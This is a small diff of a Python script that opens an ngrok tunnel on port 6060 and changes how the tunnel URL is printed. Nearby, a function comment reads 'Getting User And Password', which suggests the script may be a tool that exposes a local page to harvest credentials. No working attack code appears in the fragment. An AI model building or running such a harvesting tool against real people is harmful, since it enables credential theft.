@@ -561,7 +561,9 @@ exit();""")
        print (Fore.Blue+" Launching Ngrok")
        global token
        link = ngrok.connect(6060,"http",auth_token=token)
-       (Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+" URL 1 : "+link)
+       print (link)
+       (Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+" URL 1 : ")
+
        
  # Getting User And Password
     def userin():
